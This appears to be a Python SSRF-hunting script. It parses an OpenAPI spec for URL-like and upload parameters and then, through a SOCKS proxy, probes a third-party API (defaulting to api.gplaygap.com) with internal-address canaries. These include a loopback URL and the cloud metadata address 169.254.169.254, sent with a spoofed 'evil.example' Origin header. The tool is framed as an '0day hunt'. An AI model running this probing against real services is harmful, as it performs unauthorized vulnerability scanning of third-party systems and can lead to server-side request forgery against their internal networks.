#!/usr/bin/env python3
"""Deterministic OpenAPI → URL-like / file-like param hunter.

This is the non-theater 0day *input list*. It does not find HDF5 0days.
It enumerates every spec parameter that looks like a fetch/upload gadget
and optionally probes with canaries via SOCKS.
"""
from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
from pathlib import Path
from urllib.parse import urljoin, urlencode

NAME_RX = re.compile(
    r"(^|_|-)(url|uri|href|callback|webhook|redirect|fetch|endpoint|avatar|"
    r"photo|imageUrl|image_url|picture|logo|icon|upload|attachment|"
    r"ipn|proxyUrl|webhookUrl|returnUrl|callbackUrl|notifyUrl|fileUrl|"
    r"cdn|mediaUrl)s?($|_|-)|Url$|URI$|Href$|webhook|callback",
    re.I,
)
STR_FMT_RX = re.compile(r"uri|url|binary|byte|password", re.I)
SKIP_PATH = re.compile(r"/docs|/swagger|/health$", re.I)
CANARY_INT = "http://127.0.0.1:9/ha-ssrf"
CANARY_META = "http://169.254.169.254/latest/meta-data/"
HTTP = ("get", "post", "put", "patch", "delete", "head")


def load_spec(path: Path) -> dict:
    raw = path.read_text(encoding="utf-8", errors="replace")
    if raw.lstrip().startswith("{"):
        return json.loads(raw)
    i = raw.find("{")
    if i < 0:
        raise SystemExit(f"not JSON: {path}")
    return json.loads(raw[i:])


def resolve_ref(spec: dict, node):
    if not isinstance(node, dict) or "$ref" not in node:
        return node
    ref = node["$ref"]
    if not isinstance(ref, str) or not ref.startswith("#/"):
        return node
    cur: object = spec
    for part in ref[2:].split("/"):
        if not isinstance(cur, dict) or part not in cur:
            return node
        cur = cur[part]
    if isinstance(cur, dict) and "$ref" in cur:
        return resolve_ref(spec, cur)
    return cur if isinstance(cur, dict) else node


def walk_schema_props(spec: dict, schema: dict, prefix: str = "", depth: int = 0) -> list[tuple[str, dict]]:
    if not isinstance(schema, dict) or depth > 6:
        return []
    schema = resolve_ref(spec, schema)
    if not isinstance(schema, dict):
        return []
    out: list[tuple[str, dict]] = []
    t = schema.get("type")
    if t == "object" or "properties" in schema:
        props = schema.get("properties") or {}
        for k, v in props.items():
            name = f"{prefix}.{k}" if prefix else k
            out.append((name, v if isinstance(v, dict) else {}))
            if isinstance(v, dict):
                out.extend(walk_schema_props(spec, v, name, depth + 1))
    items = schema.get("items")
    if t == "array" and isinstance(items, dict):
        out.extend(walk_schema_props(spec, items, prefix + "[]", depth + 1))
    return out


def interesting_name(name: str, schema: dict | None) -> bool:
    if NAME_RX.search(name or ""):
        return True
    if isinstance(schema, dict):
        fmt = str(schema.get("format") or "")
        if STR_FMT_RX.search(fmt):
            return True
        if schema.get("type") == "string" and NAME_RX.search(str(schema.get("description") or "")):
            return True
    return False


def collect(spec: dict) -> list[dict]:
    hits: list[dict] = []
    paths = spec.get("paths") or {}
    for pth, item in paths.items():
        if not isinstance(item, dict) or SKIP_PATH.search(pth):
            continue
        for method in HTTP:
            op = item.get(method)
            if not isinstance(op, dict):
                continue
            for prm in op.get("parameters") or item.get("parameters") or []:
                if not isinstance(prm, dict):
                    continue
                name = prm.get("name") or ""
                schema = prm.get("schema") if isinstance(prm.get("schema"), dict) else {}
                if interesting_name(name, schema):
                    hits.append(
                        {
                            "path": pth,
                            "method": method.upper(),
                            "loc": prm.get("in") or "query",
                            "name": name,
                            "kind": "param",
                        }
                    )
            rb = op.get("requestBody")
            if isinstance(rb, dict):
                content = rb.get("content") or {}
                for ctype, cobj in content.items():
                    if not isinstance(cobj, dict):
                        continue
                    sch = cobj.get("schema") if isinstance(cobj.get("schema"), dict) else {}
                    if "multipart" in ctype or "octet-stream" in ctype:
                        hits.append(
                            {
                                "path": pth,
                                "method": method.upper(),
                                "loc": "body",
                                "name": ctype,
                                "kind": "upload",
                            }
                        )
                    for pname, psch in walk_schema_props(spec, sch):
                        if interesting_name(pname.split(".")[-1], psch):
                            hits.append(
                                {
                                    "path": pth,
                                    "method": method.upper(),
                                    "loc": "body",
                                    "name": pname,
                                    "kind": "body-url" if "url" in pname.lower() or "uri" in pname.lower() else "body-fileish",
                                    "content_type": ctype,
                                }
                            )
    # dedup
    seen = set()
    uniq = []
    for h in hits:
        k = (h["method"], h["path"], h["loc"], h["name"])
        if k in seen:
            continue
        seen.add(k)
        uniq.append(h)
    return uniq


def curl_status(base: str, proxy: str, method: str, path: str, loc: str, name: str, canary: str) -> dict:
    url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
    cmd = [
        "curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}",
        "--max-time", "12", "-x", proxy, "-X", method,
        "-H", "Origin: https://evil.example",
    ]
    if loc == "query":
        sep = "&" if "?" in url else "?"
        url = url + sep + urlencode({name: canary})
    elif loc == "path":
        url = url.replace("{" + name + "}", canary.replace("://", "_"))
    elif loc == "header":
        cmd.extend(["-H", f"{name}: {canary}"])
    elif loc == "body":
        cmd.extend(["-H", "Content-Type: application/json", "-d", json.dumps({name.split(".")[-1]: canary})])
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=16)
        code = (r.stdout or "").strip()
        return {"status": int(code) if code.isdigit() else None, "stderr": (r.stderr or "")[:200], "url": url}
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        return {"status": None, "error": str(e), "url": url}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--spec", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--base", default="https://api.gplaygap.com")
    ap.add_argument("--proxy", default="socks5h://127.0.0.1:10808")
    ap.add_argument("--probe", action="store_true")
    ap.add_argument("--limit", type=int, default=40)
    args = ap.parse_args()
    spec = load_spec(Path(args.spec))
    hits = collect(spec)
    out = Path(args.out).expanduser().resolve()
    out.mkdir(parents=True, exist_ok=True)
    (out / ".bus").mkdir(exist_ok=True)
    hunt_dir = out / "0day-hunt"
    hunt_dir.mkdir(exist_ok=True)
    list_path = hunt_dir / "urlparams.json"
    list_path.write_text(json.dumps({"count": len(hits), "hits": hits}, indent=2) + "\n", encoding="utf-8")
    report: dict = {"ok": True, "count": len(hits), "list": str(list_path), "probed": 0}
    if args.probe:
        jsonl = hunt_dir / "urlparams-probes.jsonl"
        n = 0
        with jsonl.open("w", encoding="utf-8") as fh:
            for h in hits:
                if n >= args.limit:
                    break
                if h["kind"] == "upload":
                    continue
                rec = dict(h)
                rec["canary"] = CANARY_INT
                rec.update(curl_status(args.base, args.proxy, h["method"], h["path"], h["loc"], h["name"], CANARY_INT))
                fh.write(json.dumps(rec) + "\n")
                n += 1
        report["probed"] = n
        report["jsonl"] = str(jsonl)
    print(json.dumps(report))
    return 0


if __name__ == "__main__":
    sys.exit(main())
